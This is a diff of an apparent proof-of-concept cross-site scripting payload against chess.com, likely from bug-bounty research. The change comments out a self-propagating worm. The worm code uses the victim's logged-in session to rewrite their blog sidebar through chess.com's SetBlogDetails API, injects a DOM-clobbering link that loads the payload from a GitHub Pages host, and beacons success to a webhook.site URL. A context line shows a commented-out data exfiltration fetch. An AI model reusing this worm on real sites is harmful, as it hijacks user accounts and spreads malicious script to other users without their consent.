@@ -57,35 +57,37 @@ alert("XSS 5 by Hussein on: " + document.domain);
 //     mode: "no-cors",
 //     body: exfilData
 // });
-const apiUrl = 'https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/SetBlogDetails';
-const username = window.context.user.username;
-const maliciousSidebar = "<p>Hey, check out this cool trick! <a id=\"__tudeConfig\"></a><a id=\"__tudeConfig\" href=\"https://hussein-e4.github.io/POC.js\" name=\"endpoint\"></a></p>";
-const requestBody = {
-    "blogDetails": {
-        "url": username, //
-        "name": username+" blog",
-        "privacy": "BLOG_PRIVACY_ID_EVERYONE", 
-        "sidebarBlock": maliciousSidebar
-    },
-    "updateMask": ""
-};
 
-// 4. (The Infection)
-fetch(apiUrl, {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json, text/plain, */*',
-        'Connect-Protocol-Version': '1'
-    },
-    credentials: 'include', 
-    body: JSON.stringify(requestBody)
-})
-.then(response => {
-    if (response.ok) {
-        fetch("https://webhook.site/b2736906-d37d-48c0-9a83-ecd2ff48a039?impact=Worm_Propagated");
-    }
-});
+
+// const apiUrl = 'https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/SetBlogDetails';
+// const username = window.context.user.username;
+// const maliciousSidebar = "<p>Hey, check out this cool trick! <a id=\"__tudeConfig\"></a><a id=\"__tudeConfig\" href=\"https://hussein-e4.github.io/POC.js\" name=\"endpoint\"></a></p>";
+// const requestBody = {
+//     "blogDetails": {
+//         "url": username, //
+//         "name": username+" blog",
+//         "privacy": "BLOG_PRIVACY_ID_EVERYONE", 
+//         "sidebarBlock": maliciousSidebar
+//     },
+//     "updateMask": ""
+// };
+
+// // 4. (The Infection)
+// fetch(apiUrl, {
+//     method: 'POST',
+//     headers: {
+//         'Content-Type': 'application/json',
+//         'Accept': 'application/json, text/plain, */*',
+//         'Connect-Protocol-Version': '1'
+//     },
+//     credentials: 'include', 
+//     body: JSON.stringify(requestBody)
+// })
+// .then(response => {
+//     if (response.ok) {
+//         fetch("https://webhook.site/b2736906-d37d-48c0-9a83-ecd2ff48a039?impact=Worm_Propagated");
+//     }
+// });
 
 
 
